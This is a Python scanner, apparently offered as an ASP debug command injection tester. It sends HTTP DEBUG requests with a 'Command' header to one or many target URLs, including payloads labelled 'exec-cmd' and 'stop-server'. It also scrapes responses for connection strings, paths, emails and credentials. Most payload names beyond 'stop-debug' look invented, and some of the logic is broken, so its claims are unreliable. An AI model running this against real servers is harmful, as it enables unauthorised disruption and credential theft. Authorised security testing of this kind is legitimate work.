#!/usr/bin/env python3
"""
Author: Vahe Demirkhanyan

Advanced ASP Debug Command Injection Tester
This script tests if a remote ASP page is vulnerable to debug command injection.
It sends HTTP requests using the non-standard DEBUG method with various command payloads
and provides detailed reporting and multiple testing options.

Usage:
    python asp_debug.py -u <target_url> [options]

Options:
    -h, --help                      Show this help message
    -u, --url <url>                 Target URL to test
    -f, --file <filename>           File containing list of URLs to test
    -c, --command <cmd>             Custom debug command (default: stop-debug)
    -a, --all-commands              Test with all known command payloads
    -t, --timeout <seconds>         Connection timeout (default: 10)
    -p, --proxy <proxy>             Use proxy (format: http://user:pass@host:port)
    -H, --header <header>           Add custom header (format: "Name: Value")
    -v, --verbose                   Enable verbose output
    -o, --output <filename>         Save results to file
    -k, --insecure                  Allow insecure server connections (ignore SSL cert verification)
    --no-color                      Disable colored output
    --color-scheme <scheme>         Choose color scheme: 'original' or 'soft' (default: soft)
"""

import sys
import urllib.parse
import http.client
import argparse
import socket
import ssl
import time
import json
import re
from datetime import datetime
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError
from urllib.parse import urlparse
import os
from collections import defaultdict
import colorama
from colorama import Fore, Style

colorama.init()

class Colors:
    ORIGINAL_HEADER = Fore.MAGENTA + Style.BRIGHT
    ORIGINAL_BLUE = Fore.BLUE
    ORIGINAL_GREEN = Fore.GREEN
    ORIGINAL_YELLOW = Fore.YELLOW
    ORIGINAL_RED = Fore.RED
    ENDC = Style.RESET_ALL
    BOLD = Style.BRIGHT

    SOFT_HEADER = Fore.CYAN
    SOFT_BLUE = Fore.LIGHTBLUE_EX
    SOFT_GREEN = Fore.LIGHTGREEN_EX
    SOFT_YELLOW = Fore.LIGHTYELLOW_EX
    SOFT_RED = Fore.LIGHTRED_EX

    HEADER = SOFT_HEADER
    BLUE = SOFT_BLUE
    GREEN = SOFT_GREEN
    YELLOW = SOFT_YELLOW
    RED = SOFT_RED

DEBUG_COMMANDS = [
    {"cmd": "stop-debug", "desc": "Stops the debug session", "danger": "Low"},
    {"cmd": "exec-cmd", "desc": "Executes commands on the server", "danger": "High"},
    {"cmd": "stop-server", "desc": "Stops the web server process", "danger": "High"},
    {"cmd": "show-config", "desc": "Displays server configuration", "danger": "Medium"},
    {"cmd": "restart-app", "desc": "Restarts the application pool", "danger": "Medium"},
    {"cmd": "dump-memory", "desc": "Creates a memory dump", "danger": "Medium"},
    {"cmd": "list-processes", "desc": "Lists running processes", "danger": "Medium"},
    {"cmd": "show-connection-info", "desc": "Displays active connections", "danger": "Low"},
    {"cmd": "get-app-pools", "desc": "Lists application pools", "danger": "Low"},
    {"cmd": "get-session-data", "desc": "Retrieves session information", "danger": "Medium"},
    {"cmd": "show-headers", "desc": "Displays HTTP header configuration", "danger": "Low"},
    {"cmd": "show-server-variables", "desc": "Displays server variables", "danger": "Medium"},
    {"cmd": "show-app-domains", "desc": "Lists application domains", "danger": "Low"},
    {"cmd": "show-installed-updates", "desc": "Lists installed updates", "danger": "Low"},
    {"cmd": "get-machine-info", "desc": "Retrieves server details", "danger": "Medium"},
    {"cmd": "show-loaded-assemblies", "desc": "Lists loaded .NET assemblies", "danger": "Medium"}
]

def print_banner():
    banner = f"""
{Colors.BLUE}╔═══════════════════════════════════════════════════════════════════╗
║ {Colors.GREEN}Advanced ASP Debug Command Injection Tester{Colors.BLUE}                      ║
║ {Colors.YELLOW}Version 2.0{Colors.BLUE}                                                     ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.ENDC}
    """
    print(banner)

def setup_proxy(proxy_url):
    if not proxy_url:
        return None
    proxy_parts = urlparse(proxy_url)
    if not proxy_parts.netloc:
        print(f"{Colors.RED}[-] Invalid proxy format. Use http://host:port or http://user:pass@host:port{Colors.ENDC}")
        sys.exit(1)
    proxy_host = proxy_parts.hostname
    proxy_port = proxy_parts.port or 8080
    proxy_username = None
    proxy_password = None
    if proxy_parts.username and proxy_parts.password:
        proxy_username = proxy_parts.username
        proxy_password = proxy_parts.password
    return {
        "host": proxy_host,
        "port": proxy_port,
        "username": proxy_username,
        "password": proxy_password
    }

def fingerprint_server(url, timeout=10, headers=None, proxy=None, verify_ssl=True, verbose=False):
    parsed = urllib.parse.urlparse(url)
    scheme = parsed.scheme
    host = parsed.netloc
    path = parsed.path if parsed.path else "/"
    default_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "close"
    }
    if headers:
        default_headers.update(headers)
    print(f"\n{Colors.BLUE}[*] Fingerprinting server at {url}{Colors.ENDC}")
    fingerprint = {
        "url": url,
        "server": "Unknown",
        "technologies": [],
        "asp_version": None,
        "iis_version": None,
        "potentially_vulnerable": False,
        "headers": {},
        "cookies": [],
        "timestamp": datetime.now().isoformat()
    }
    try:
        if scheme.lower() == "https":
            conn = http.client.HTTPSConnection(host, timeout=timeout)
        else:
            conn = http.client.HTTPConnection(host, timeout=timeout)
        conn.request("GET", path, headers=default_headers)
        response = conn.getresponse()
        data = response.read().decode('utf-8', errors='replace')
        for k, v in response.getheaders():
            fingerprint["headers"][k.lower()] = v
        if "server" in fingerprint["headers"]:
            fingerprint["server"] = fingerprint["headers"]["server"]
            if "microsoft-iis" in fingerprint["server"].lower():
                fingerprint["technologies"].append("IIS")
                fingerprint["potentially_vulnerable"] = True
                iis_version_match = re.search(r"Microsoft-IIS/(\d+\.\d+)", fingerprint["server"], re.IGNORECASE)
                if iis_version_match:
                    fingerprint["iis_version"] = iis_version_match.group(1)
        if "x-aspnet-version" in fingerprint["headers"]:
            fingerprint["technologies"].append("ASP.NET")
            fingerprint["asp_version"] = fingerprint["headers"]["x-aspnet-version"]
            fingerprint["potentially_vulnerable"] = True
        if "x-aspnetmvc-version" in fingerprint["headers"]:
            fingerprint["technologies"].append("ASP.NET MVC")
        if ".aspx" in data:
            if "ASP.NET" not in fingerprint["technologies"]:
                fingerprint["technologies"].append("ASP.NET")
                fingerprint["potentially_vulnerable"] = True
        if "content-type" in fingerprint["headers"]:
            if "application/json" in fingerprint["headers"]["content-type"]:
                fingerprint["technologies"].append("JSON API")
        if "set-cookie" in fingerprint["headers"]:
            cookies = fingerprint["headers"]["set-cookie"].split(",")
            for cookie in cookies:
                cookie_name = cookie.split("=")[0].strip()
                fingerprint["cookies"].append(cookie_name)
                if cookie_name.lower() in ("asp.net_sessionid", "aspsessionid"):
                    if "ASP.NET" not in fingerprint["technologies"]:
                        fingerprint["technologies"].append("ASP.NET")
                        fingerprint["potentially_vulnerable"] = True
        print(f"{Colors.GREEN}[+] Server identified: {fingerprint['server']}{Colors.ENDC}")
        if fingerprint["technologies"]:
            print(f"{Colors.GREEN}[+] Technologies detected: {', '.join(fingerprint['technologies'])}{Colors.ENDC}")
        if fingerprint["asp_version"]:
            print(f"{Colors.GREEN}[+] ASP.NET Version: {fingerprint['asp_version']}{Colors.ENDC}")
        if fingerprint["iis_version"]:
            print(f"{Colors.GREEN}[+] IIS Version: {fingerprint['iis_version']}{Colors.ENDC}")
        if fingerprint["potentially_vulnerable"]:
            print(f"{Colors.YELLOW}[!] Server might be vulnerable to ASP debug commands{Colors.ENDC}")
        else:
            print(f"{Colors.BLUE}[-] Server unlikely to be vulnerable to ASP debug commands{Colors.ENDC}")
        fingerprint["suitable_commands"] = get_suitable_commands(fingerprint)
        if fingerprint["suitable_commands"]:
            print(f"{Colors.GREEN}[+] Suggested commands to try: {', '.join([cmd['cmd'] for cmd in fingerprint['suitable_commands']])}{Colors.ENDC}")
        return fingerprint
    except Exception as e:
        print(f"{Colors.RED}[-] Error during fingerprinting: {str(e)}{Colors.ENDC}")
        return fingerprint

def get_suitable_commands(fingerprint):
    suitable_commands = []
    if not fingerprint["potentially_vulnerable"]:
        return [cmd for cmd in DEBUG_COMMANDS if cmd["danger"] == "Low"]
    if "IIS" in fingerprint["technologies"]:
        if fingerprint["iis_version"]:
            iis_version = float(fingerprint["iis_version"].split(".")[0])
            if iis_version <= 6.0:
                suitable_commands = DEBUG_COMMANDS
            elif iis_version <= 7.5:
                suitable_commands = [cmd for cmd in DEBUG_COMMANDS 
                                   if cmd["cmd"] not in ["exec-cmd", "stop-server"]]
            else:
                suitable_commands = [cmd for cmd in DEBUG_COMMANDS 
                                   if cmd["danger"] != "High"]
        else:
            suitable_commands = DEBUG_COMMANDS
    elif "ASP.NET" in fingerprint["technologies"]:
        if fingerprint["asp_version"]:
            asp_version = fingerprint["asp_version"].split(".")[0]
            if int(asp_version) < 4:
                suitable_commands = [cmd for cmd in DEBUG_COMMANDS
                                  if cmd["cmd"] in ["stop-debug", "show-config", "show-connection-info", 
                                                   "show-headers", "show-server-variables"]]
            else:
                suitable_commands = [cmd for cmd in DEBUG_COMMANDS
                                  if cmd["danger"] != "High"]
        else:
            suitable_commands = [cmd for cmd in DEBUG_COMMANDS
                               if cmd["danger"] != "High"]
    else:
        suitable_commands = [cmd for cmd in DEBUG_COMMANDS if cmd["danger"] != "High"]
    return suitable_commands

def extract_debug_info(data, command):
    extracted_info = {
        "command": command,
        "extracted_data": {}
    }
    if command == "show-config":
        config_patterns = {
            "connection_strings": r"ConnectionString[s]?.*?=.*?\"(.*?)\"",
            "app_path": r"Physical[A]?pplication[P]?ath.*?=.*?\"(.*?)\"",
            "machine_name": r"MachineName.*?=.*?\"(.*?)\"",
            "framework_version": r"\.NET.*?[V]?ersion.*?=.*?\"(.*?)\"",
            "temp_folder": r"Temp[F]?older.*?=.*?\"(.*?)\"",
        }
        for key, pattern in config_patterns.items():
            matches = re.findall(pattern, data, re.IGNORECASE | re.DOTALL)
            if matches:
                extracted_info["extracted_data"][key] = matches
    elif command == "list-processes":
        if "PID" in data or "Process ID" in data:
            processes = []
            pid_pattern = r"(\d+)\s+(\S+)\s+(\S+)"
            matches = re.findall(pid_pattern, data)
            if matches:
                for match in matches:
                    if len(match) >= 3:
                        processes.append({
                            "pid": match[0],
                            "name": match[1],
                            "memory": match[2] if len(match) > 2 else "Unknown"
                        })
                extracted_info["extracted_data"]["processes"] = processes
    elif command == "show-connection-info":
        connection_count_pattern = r"(\d+)\s+active connections"
        matches = re.search(connection_count_pattern, data)
        if matches:
            extracted_info["extracted_data"]["active_connections"] = matches.group(1)
        ip_pattern = r"\b(?:\d{1,3}\.){3}\d{1,3}\b"
        ip_matches = re.findall(ip_pattern, data)
        if ip_matches:
            extracted_info["extracted_data"]["ip_addresses"] = list(set(ip_matches))
    elif command == "show-server-variables":
        var_pattern = r"(\w+)\s*=\s*\"?(.*?)\"?\s*(?:\n|$)"
        matches = re.findall(var_pattern, data)
        if matches:
            variables = {}
            for match in matches:
                if len(match) >= 2:
                    variables[match[0]] = match[1]
            extracted_info["extracted_data"]["server_variables"] = variables
    elif command == "get-app-pools":
        apppool_pattern = r"(\w+)\s+(\w+)\s+(.+)"
        matches = re.findall(apppool_pattern, data)
        if matches:
            app_pools = []
            for match in matches:
                if len(match) >= 3:
                    app_pools.append({
                        "name": match[0],
                        "state": match[1],
                        "apps": match[2]
                    })
            extracted_info["extracted_data"]["app_pools"] = app_pools
    elif command == "show-loaded-assemblies":
        assembly_pattern = r"(\S+),\s+Version=(\d+\.\d+\.\d+\.\d+)"
        matches = re.findall(assembly_pattern, data)
        if matches:
            assemblies = []
            for match in matches:
                if len(match) >= 2:
                    assemblies.append({
                        "name": match[0],
                        "version": match[1]
                    })
            extracted_info["extracted_data"]["assemblies"] = assemblies
    path_pattern = r"[A-Z]:\\[^\\:*?\"<>|\r\n]+"
    path_matches = re.findall(path_pattern, data)
    if path_matches:
        extracted_info["extracted_data"]["file_paths"] = list(set(path_matches))
    email_pattern = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
    email_matches = re.findall(email_pattern, data)
    if email_matches:
        extracted_info["extracted_data"]["emails"] = list(set(email_matches))
    cred_pattern = r"(?:password|pwd|pass|user|username)\s*[=:]\s*[\"']?(.*?)[\"']?"
    cred_matches = re.findall(cred_pattern, data, re.IGNORECASE)
    if cred_matches:
        extracted_info["extracted_data"]["potential_credentials"] = list(set(cred_matches))
    return extracted_info

def send_debug_request(url, command, timeout=10, headers=None, proxy=None, verify_ssl=True, verbose=False):
    parsed = urllib.parse.urlparse(url)
    scheme = parsed.scheme
    host = parsed.netloc
    path = parsed.path if parsed.path else "/"
    if parsed.query:
        path += "?" + parsed.query
    default_headers = {
        "Accept-Charset": "iso-8859-1,utf-8;q=0.9,*;q=0.1",
        "Accept-Language": "en",
        "Command": command,
        "Connection": "Keep-Alive",
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)",
        "Pragma": "no-cache",
        "Accept": "image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*"
    }
    if headers:
        default_headers.update(headers)
    context = None
    if scheme.lower() == "https":
        context = ssl.create_default_context()
        if not verify_ssl:
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
    if verbose:
        print(f"\n{Colors.BLUE}[*] Sending DEBUG request:{Colors.ENDC}")
        print(f"  URL: {url}")
        print(f"  Command: {command}")
        print(f"  Headers:")
        for name, value in default_headers.items():
            print(f"    {name}: {value}")
    try:
        start_time = time.time()
        if proxy and proxy["host"]:
            if verbose:
                print(f"  Using proxy: {proxy['host']}:{proxy['port']}")
            if scheme.lower() == "https":
                conn = http.client.HTTPSConnection(proxy["host"], proxy["port"], timeout=timeout, context=context)
                conn.set_tunnel(host, headers=default_headers)
            else:
                conn = http.client.HTTPConnection(proxy["host"], proxy["port"], timeout=timeout)
                conn.set_tunnel(host, headers=default_headers)
        else:
            if scheme.lower() == "https":
                conn = http.client.HTTPSConnection(host, timeout=timeout, context=context)
            else:
                conn = http.client.HTTPConnection(host, timeout=timeout)
        conn.request("DEBUG", path, headers=default_headers)
        response = conn.getresponse()
        data = response.read().decode('utf-8', errors='replace').strip()
        elapsed = time.time() - start_time
        headers_dict = {k.lower(): v for k, v in response.getheaders()}
        server_info = headers_dict.get('server', 'Unknown')
        is_vulnerable = False
        reason = ""
        if response.status == 200 and data == "OK":
            is_vulnerable = True
            reason = "Received 'OK' response"
        elif response.status == 200 and "debug" in data.lower():
            is_vulnerable = True
            reason = "Response contains debug information"
        elif any(indicator in data.lower() for indicator in ["command accepted", "debug mode", "successfully"]):
            is_vulnerable = True
            reason = "Response indicates command was accepted"
        if verbose:
            print(f"\n{Colors.BLUE}[*] Response received in {elapsed:.2f}s:{Colors.ENDC}")
            print(f"  Status: {response.status} {response.reason}")
            print(f"  Server: {server_info}")
            print(f"  Content-Type: {headers_dict.get('content-type', 'Not specified')}")
            print(f"  Content-Length: {headers_dict.get('content-length', 'Not specified')}")
            print(f"  Response Data:")
            if len(data) > 500:
                print(f"    {data[:500]}... [truncated]")
            else:
                print(f"    {data}")
        conn.close()
        extracted_info = {}
        if is_vulnerable and len(data) > 0:
            extracted_info = extract_debug_info(data, command)
            if extracted_info["extracted_data"] and verbose:
                print(f"\n{Colors.GREEN}[+] Extracted interesting information:{Colors.ENDC}")
                for key, value in extracted_info["extracted_data"].items():
                    print(f"  {key}: {value}")
        result = {
            "url": url,
            "command": command,
            "status": response.status,
            "reason": response.reason,
            "elapsed": elapsed,
            "server": server_info,
            "data": data,
            "is_vulnerable": is_vulnerable,
            "vulnerability_reason": reason if is_vulnerable else None,
            "extracted_info": extracted_info.get("extracted_data", {}),
            "timestamp": datetime.now().isoformat()
        }
        return result
    except (socket.timeout, TimeoutError) as e:
        if verbose:
            print(f"\n{Colors.YELLOW}[!] Connection timed out: {str(e)}{Colors.ENDC}")
        return {
            "url": url,
            "command": command,
            "error": f"Connection timed out: {str(e)}",
            "is_vulnerable": False,
            "timestamp": datetime.now().isoformat()
        }
    except (ConnectionRefusedError, ConnectionError) as e:
        if verbose:
            print(f"\n{Colors.RED}[-] Connection error: {str(e)}{Colors.ENDC}")
        return {
            "url": url,
            "command": command,
            "error": f"Connection error: {str(e)}",
            "is_vulnerable": False,
            "timestamp": datetime.now().isoformat()
        }
    except Exception as e:
        if verbose:
            print(f"\n{Colors.RED}[-] Error accessing target: {str(e)}{Colors.ENDC}")
        return {
            "url": url,
            "command": command,
            "error": f"Error accessing target: {str(e)}",
            "is_vulnerable": False,
            "timestamp": datetime.now().isoformat()
        }

def print_result(result, verbose=False):
    if "error" in result:
        print(f"{Colors.RED}[-] {result['url']} - Error: {result['error']}{Colors.ENDC}")
        return
    if result["is_vulnerable"]:
        print(f"{Colors.GREEN}[+] {result['url']} - VULNERABLE! {Colors.YELLOW}[{result['vulnerability_reason']}]{Colors.ENDC}")
        cmd_desc = next((cmd["desc"] for cmd in DEBUG_COMMANDS if cmd["cmd"] == result["command"]), "Unknown command")
        print(f"    Command: {result['command']} - {cmd_desc}")
        print(f"    Status: {result['status']} {result['reason']}")
        if result.get("extracted_info") and len(result["extracted_info"]) > 0:
            print(f"    {Colors.GREEN}[*] Information discovered:{Colors.ENDC}")
            for key, value in result["extracted_info"].items():
                if isinstance(value, list) and len(value) > 3:
                    print(f"      {key}: {value[:3]} ... [{len(value)} items total]")
                elif isinstance(value, dict) and len(value) > 3:
                    keys = list(value.keys())[:3]
                    print(f"      {key}: {', '.join([f'{k}={value[k]}' for k in keys])} ... [{len(value)} items total]")
                else:
                    print(f"      {key}: {value}")
        elif not verbose and len(result['data']) > 0:
            if len(result['data']) > 200:
                print(f"    Response: {result['data'][:200]}... [truncated]")
            else:
                print(f"    Response: {result['data']}")
    else:
        print(f"{Colors.BLUE}[-] {result['url']} - Not vulnerable (Status: {result['status']}){Colors.ENDC}")

def save_results(results, filename):
    try:
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"{Colors.GREEN}[+] Results saved to {filename}{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.RED}[-] Error saving results: {str(e)}{Colors.ENDC}")

def load_targets(filename):
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
    except Exception as e:
        print(f"{Colors.RED}[-] Error loading targets: {str(e)}{Colors.ENDC}")
        sys.exit(1)

def parse_custom_headers(header_list):
    headers = {}
    if not header_list:
        return headers
    for header in header_list:
        if ":" not in header:
            print(f"{Colors.YELLOW}[!] Ignoring invalid header format: {header}{Colors.ENDC}")
            continue
        name, value = header.split(":", 1)
        headers[name.strip()] = value.strip()
    return headers

def main():
    parser = argparse.ArgumentParser(description="ASP Debug Command Injection Tester")
    target_group = parser.add_argument_group("Target")
    target_exclusive = target_group.add_mutually_exclusive_group(required=True)
    target_exclusive.add_argument("-u", "--url", help="Target URL to test")
    target_exclusive.add_argument("-f", "--file", help="File containing list of URLs to test")
    command_group = parser.add_argument_group("Command")
    command_exclusive = command_group.add_mutually_exclusive_group()
    command_exclusive.add_argument("-c", "--command", default="stop-debug", help="Custom debug command (default: stop-debug)")
    command_exclusive.add_argument("-a", "--all-commands", action="store_true", help="Test with all known command payloads")
    command_group.add_argument("--list-commands", action="store_true", help="List all available debug commands and exit")
    command_group.add_argument("--safe-only", action="store_true", help="Only test commands with low danger level")
    command_group.add_argument("--fingerprint", action="store_true", help="Attempt to fingerprint the server and find applicable commands")
    connection_group = parser.add_argument_group("Connection")
    connection_group.add_argument("-t", "--timeout", type=int, default=10, help="Connection timeout in seconds (default: 10)")
    connection_group.add_argument("-p", "--proxy", help="Use proxy (format: http://user:pass@host:port)")
    connection_group.add_argument("-k", "--insecure", action="store_true", help="Allow insecure server connections (ignore SSL cert verification)")
    output_group = parser.add_argument_group("Output")
    output_group.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    output_group.add_argument("-o", "--output", help="Save results to file")
    output_group.add_argument("--no-color", action="store_true", help="Disable colored output")
    output_group.add_argument("--color-scheme", choices=["original", "soft"], default="soft", help="Choose color scheme: 'original' or 'soft' (default: soft)")
    additional_group = parser.add_argument_group("Additional")
    additional_group.add_argument("-H", "--header", action="append", help="Add custom header (format: \"Name: Value\")")
    args = parser.parse_args()
    if args.no_color:
        Colors.HEADER = Colors.BLUE = Colors.GREEN = Colors.YELLOW = Colors.RED = Colors.ENDC = Colors.BOLD = ""
    elif args.color_scheme == 'original':
        Colors.HEADER = Colors.ORIGINAL_HEADER
        Colors.BLUE = Colors.ORIGINAL_BLUE
        Colors.GREEN = Colors.ORIGINAL_GREEN
        Colors.YELLOW = Colors.ORIGINAL_YELLOW
        Colors.RED = Colors.ORIGINAL_RED
    else:
        Colors.HEADER = Colors.SOFT_HEADER
        Colors.BLUE = Colors.SOFT_BLUE
        Colors.GREEN = Colors.SOFT_GREEN
        Colors.YELLOW = Colors.SOFT_YELLOW
        Colors.RED = Colors.SOFT_RED
    print_banner()
    targets = []
    if args.url:
        targets = [args.url]
    elif args.file:
        targets = load_targets(args.file)
        print(f"{Colors.BLUE}[*] Loaded {len(targets)} targets from {args.file}{Colors.ENDC}")
    if args.list_commands:
        print(f"\n{Colors.BLUE}[*] Available debug commands:{Colors.ENDC}")
        print(f"{'Command':<25} {'Description':<40} {'Risk Level':<10}")
        print("-" * 75)
        for cmd_info in DEBUG_COMMANDS:
            danger_color = Colors.RED if cmd_info["danger"] == "High" else (Colors.YELLOW if cmd_info["danger"] == "Medium" else Colors.GREEN)
            print(f"{cmd_info['cmd']:<25} {cmd_info['desc']:<40} {danger_color}{cmd_info['danger']:<10}{Colors.ENDC}")
        sys.exit(0)
    commands = []
    if args.all_commands:
        if args.safe_only:
            commands = [cmd_info["cmd"] for cmd_info in DEBUG_COMMANDS if cmd_info["danger"] == "Low"]
            print(f"{Colors.BLUE}[*] Testing with {len(commands)} safe debug commands{Colors.ENDC}")
        else:
            commands = [cmd_info["cmd"] for cmd_info in DEBUG_COMMANDS]
            print(f"{Colors.BLUE}[*] Testing with {len(commands)} different debug commands{Colors.ENDC}")
    else:
        commands = [args.command]
    custom_headers = parse_custom_headers(args.header)
    proxy = setup_proxy(args.proxy)
    all_results = []
    server_fingerprints = {}
    for target in targets:
        print(f"\n{Colors.HEADER}{Colors.BOLD}[*] Testing target: {target}{Colors.ENDC}")
        if args.fingerprint:
            fingerprint = fingerprint_server(
                url=target,
                timeout=args.timeout,
                headers=custom_headers,
                proxy=proxy,
                verify_ssl=not args.insecure,
                verbose=args.verbose
            )
            server_fingerprints[target] = fingerprint
            if fingerprint["suitable_commands"]:
                if not args.all_commands and not args.command:
                    commands = [cmd_info["cmd"] for cmd_info in fingerprint["suitable_commands"]]
                    print(f"{Colors.BLUE}[*] Using {len(commands)} commands suggested by fingerprinting{Colors.ENDC}")
        target_results = []
        for command in commands:
            result = send_debug_request(
                url=target,
                command=command,
                timeout=args.timeout,
                headers=custom_headers,
                proxy=proxy,
                verify_ssl=not args.insecure,
                verbose=args.verbose
            )
            print_result(result, args.verbose)
            target_results.append(result)
            if result["is_vulnerable"] and not args.all_commands:
                break
            if len(commands) > 1:
                time.sleep(0.5)
        all_results.extend(target_results)
    vulnerable_count = sum(1 for r in all_results if r.get("is_vulnerable", False))
    total_targets = len(targets)
    print(f"\n{Colors.HEADER}{Colors.BOLD}[*] Testing completed:{Colors.ENDC}")
    print(f"  Targets tested: {total_targets}")
    print(f"  Commands tested: {len(commands)}")
    print(f"  Vulnerable targets: {vulnerable_count}")
    if args.output:
        save_results(all_results, args.output)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Testing interrupted by user{Colors.ENDC}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[-] Unexpected error: {str(e)}{Colors.ENDC}")
        sys.exit(1)
